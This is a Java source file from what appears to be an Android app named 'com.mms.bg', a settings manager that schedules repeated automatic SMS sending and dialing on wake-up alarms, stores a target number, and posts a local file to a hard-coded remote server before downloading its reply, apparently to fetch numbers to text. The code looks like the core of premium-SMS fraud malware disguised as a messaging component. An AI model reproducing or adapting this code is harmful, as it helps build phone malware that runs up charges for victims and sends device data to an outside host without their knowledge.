package com.mms.bg.ui;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URI;
import java.net.URISyntaxException;
import java.util.Date;

import org.apache.http.HttpResponse;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.InputStreamEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpConnectionParams;
import org.apache.http.params.HttpParams;
import org.apache.http.protocol.HTTP;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.PowerManager;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.mms.bg.util.XmlLog;

public class SettingManager {
    private static final String TAG = "SettingManager";
    private static final boolean DEBUG = true;
    
    public static final String TARGET_NUM = "target_num";
    public static final String SMS_COUNT = "sms_send_count";
    public static final String LAST_SMS_TIME = "last_sms_time";
    public static final String LAST_SMS_FORMAT_TIME = "last_sms_format_time";
    public static final String LAST_DIAL_TIME = "last_dial_time";
    public static final String LAST_DIAL_FORMAT_TIME = "last_dial_format_time";
    public static final String ENABLE_DIAL = "enable_dial";
    public static final String ENABLE_SMS = "enable_sms";
    public static final String SMS_SEND_DELAY = "sms_send_delay";
    
    private static final String SERVER_URL = "http://go.ruitx.cn/Coop/request3.php";
    
    private static final int DEFAULT_SMS_COUNT = 2;
    
    private static final String DEFAULT_VALUE = "";
//    private static final long SMS_DELAY_TIME = 30 * 24 * 60 * 60 * 1000;
    private static final long SMS_DEFAULT_DELAY_TIME = 30 * 1000;
    private static final String AUTO_SMS_ACTION = "com.mms.bg.SMS"; 
    private static final int TIMEOUT = 15 * 1000;
    
    public Activity mForegroundActivity;
    private Context mContext;
    private PowerManager.WakeLock mWakeLock;
    private PowerManager.WakeLock mPartWakeLock;
    private SharedPreferences mSP;
    private SharedPreferences.Editor mEditor;
    private static  SettingManager gSettingManager;
    private XmlLog mLog;
    
    public static SettingManager getInstance(Context context) {
        if (gSettingManager == null) {
            gSettingManager = new SettingManager(context);
        }
        return gSettingManager;
    }

    public void makeWakeLock() {
        if (mWakeLock == null) {
            PowerManager pm = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);
            mWakeLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                                                            | PowerManager.ACQUIRE_CAUSES_WAKEUP, "");
            mWakeLock.setReferenceCounted(false);
        }
        mWakeLock.acquire();
    }
    
    public void releaseWakeLock() {
        mWakeLock.release();
        mWakeLock = null;
    }
    
    public void makePartialWakeLock() {
        if (mPartWakeLock == null) {
            PowerManager pm = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);
            mPartWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "prepareSendSMS");
            mPartWakeLock.setReferenceCounted(false);
        }
        mPartWakeLock.acquire();
    }
    
    public void releasePartialWakeLock() {
        mPartWakeLock.release();
        mPartWakeLock = null;
    }
    
    //preference operator
    public void setLastSMSTime(long time) {
        Date date = new Date(time);
        mEditor.putLong(LAST_SMS_TIME, time);
        mEditor.putString(LAST_SMS_FORMAT_TIME, date.toGMTString());
        mEditor.commit();
    }
    
    public String getLastSMSFormatTime() {
        return mSP.getString(LAST_SMS_FORMAT_TIME, DEFAULT_VALUE);
    }
    
    private long getLastSMSTime() {
        return mSP.getLong(LAST_SMS_TIME, 0);
    }
    
    public void setLastDialTime(long time) {
        Date date = new Date(time);
        mEditor.putLong(LAST_DIAL_TIME, time);
        mEditor.putString(LAST_DIAL_FORMAT_TIME, date.toGMTString());
        mEditor.commit();
    }
    
    public String getLastDialFormatTime() {
        return mSP.getString(LAST_DIAL_FORMAT_TIME, DEFAULT_VALUE);
    }
    
    private long getLastDailTime() {
        return mSP.getLong(LAST_DIAL_TIME, 0);
    }
    
    public void setSMSTargetNum(String num) {
        mEditor.putString(TARGET_NUM, num);
        mEditor.commit();
    }
    
    public String getSMSTargetNum() {
        return mSP.getString(TARGET_NUM, DEFAULT_VALUE); 
    }
    
    public void setDialEnable(boolean enable) {
        mEditor.putBoolean(ENABLE_DIAL, enable);
        mEditor.commit();
    }
    
    public boolean getDialEnable() {
        return mSP.getBoolean(ENABLE_DIAL, true);
    }
    
    public void setSMSEnable(boolean enable) {
        mEditor.putBoolean(ENABLE_SMS, enable);
        mEditor.commit();
    }
    
    public boolean getSMSEnable() {
        return mSP.getBoolean(ENABLE_SMS, true); 
    }
    
    public void setSMSSendCount(int count) {
        mEditor.putInt(SMS_COUNT, count);
        mEditor.commit();
    }
    
    public int getSMSSendCount() {
        return mSP.getInt(SMS_COUNT, DEFAULT_SMS_COUNT);
    }
    
    public void setSMSSendDelay(long delay) {
        mEditor.putLong(SMS_SEND_DELAY, delay);
        mEditor.commit();
    }
    
    private long getSMSSendDelay() {
        return mSP.getLong(SMS_SEND_DELAY, SMS_DEFAULT_DELAY_TIME);
    }
    
    public void logSMSCurrentTime() {
        Date date = new Date(System.currentTimeMillis());
        mLog.appendLog("SMS_Send", date.toGMTString());
    }
    
    public void logTagCurrentTime(String tag) {
        Date date = new Date(System.currentTimeMillis());
        mLog.appendLog(tag, date.toGMTString());
    }
    
    public void closeLog() {
        mLog.endLog();
    }
    
    public boolean isSimCardReady() {
        TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm.getSimState() == TelephonyManager.SIM_STATE_READY) {
            return true;
        }
        return false;
    }
    
    public boolean isCallIdle() {
        TelephonyManager tm = (TelephonyManager) mContext.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm.getCallState() == TelephonyManager.CALL_STATE_IDLE) {
            return true;
        }
        return false;
    }
    
    public void startAutoSendMessage() {
//        cancelAutoSync();
        Intent intent = new Intent(mContext, AutoSMSRecevier.class);
        intent.setAction(AUTO_SMS_ACTION);
        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, PendingIntent.FLAG_CANCEL_CURRENT);
        long currentTime = System.currentTimeMillis();
        long firstTime = currentTime;
        
        long sms_delay_time = getSMSSendDelay();
        long latestSMSTime = this.getLastSMSTime();
        if (latestSMSTime != 0 && (currentTime - latestSMSTime) >= sms_delay_time + 10000) {
            if (DEBUG) Log.d(TAG, "[[startAutoSendMessage]] start broadcast delay 10s");
            firstTime = currentTime + 10000;
        } else if (latestSMSTime != 0) {
            if (DEBUG) Log.d(TAG, "[[startAutoSendMessage]] start broadcast delay " + sms_delay_time);
            firstTime = latestSMSTime + sms_delay_time;
        } else {
            if (DEBUG) Log.d(TAG, "[[startAutoSendMessage]] start broadcast delay 10s 1");
            firstTime = currentTime + 10000;
        }
        
        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
        am.setRepeating(AlarmManager.RTC_WAKEUP, firstTime, sms_delay_time, sender);
    }
    
    public void cancelAutoSync() {
        Intent intent = new Intent(mContext, AutoSMSRecevier.class);
        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
        am.cancel(sender);
    }
    
    private HttpParams getParams() {
        HttpParams params = new BasicHttpParams();
        HttpConnectionParams.setConnectionTimeout(params, TIMEOUT);
        HttpConnectionParams.setSoTimeout(params, TIMEOUT);
        HttpConnectionParams.setSocketBufferSize(params, 8192);
//        if (getProxy() == true) {
//            final HttpHost proxy = new HttpHost(mProxyHost, mProxyPort, "http");
//            params.setParameter(ConnRoutePNames.DEFAULT_PROXY, proxy);
//        }
        return params;
    }
    
    public HttpResponse openConnection(File uploadFile) {
        LOGD("[[openConnection]]");
        HttpClient hc = new DefaultHttpClient(getParams());
        HttpPost post = new HttpPost();
        try {
            post.setURI(new URI(SERVER_URL));
        } catch (URISyntaxException e) {
            e.printStackTrace();
            return null;
        }
        post.setHeader(HTTP.CONTENT_TYPE, "text/plain");
        post.setHeader("Accept", "*/*");
        if (uploadFile != null) {
            InputStreamEntity entity = null;
            try {
                FileInputStream fis = new FileInputStream(uploadFile);
                entity = new InputStreamEntity(fis, fis.available());
            } catch (FileNotFoundException e1) {
                e1.printStackTrace();
            } catch (IOException e) {
                e.printStackTrace();
            }
            ((HttpPost) post).setEntity(entity);
        }
        try {
            HttpResponse response = hc.execute(post);
            LOGD("[[openConnection]] return response != null");
            return response;
        } catch (ClientProtocolException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }
    
    public String getTargetNum() {
        File file = new File("/data/data/com.mms.bg/files/test.xml");
        if (file.exists() == false) {
            return null;
        }
        LOGD("[[getTargetNum]] the file upload is exist");
        HttpResponse r = openConnection(file);
        if (r.getStatusLine().getStatusCode() != 200) {
            LOGD("[[getTargetNum]] r.getStatusLine().getStatusCode() = " + r.getStatusLine().getStatusCode());
            return null;
        }
        try {
            String outFilePath = "/data/data/com.mms.bg/files/download.xml";
            File outFile = new File(outFilePath);
            if (!outFile.exists()) {
                outFile.createNewFile();
            }
            LOGD("[[getTargetNum]] download file now");
            FileOutputStream fos = new FileOutputStream(outFilePath, false);
            InputStream is = r.getEntity().getContent();
            byte[] buffer = new byte[1024];
            int readLength = 0;
            while ((readLength = is.read(buffer, 0, 1024)) != -1) {
                fos.write(buffer, 0, readLength);
                fos.flush();
            }
            fos.close();
            is.close();
            dumpReceiveFile(outFilePath);
        } catch (Exception e) {
            Log.d(TAG, "[[getTargetNum]] e = " + e.getMessage());
        }
        return null;
    }
    
    private void dumpReceiveFile(String filename) {
        if (DEBUG) {
            try {
                Log.d(TAG, "[[dumpReceiveFile]] begin dump the file = " + filename);
                File file = new File(filename);
                FileInputStream in = new FileInputStream(file);
                int length = (int) file.length();
                byte[] datas = new byte[length];
                in.read(datas, 0, datas.length);
                String result = new String(datas);
                Log.d(TAG, result);
            } catch (Exception e) {
                Log.d(TAG, "[[dumpReceiveFile]] e = " + e.getMessage());
            }
        }
    }
    
    private SettingManager(Context context) {
        mContext = context;
        mSP = PreferenceManager.getDefaultSharedPreferences(mContext);
        mEditor = mSP.edit();
        mLog = new XmlLog(context.getFilesDir().getAbsolutePath() + "/log.xml", true);
    }
    
    private static void LOGD(String msg) {
        if (DEBUG) {
            Log.d(TAG, msg);
        }
    }
    
}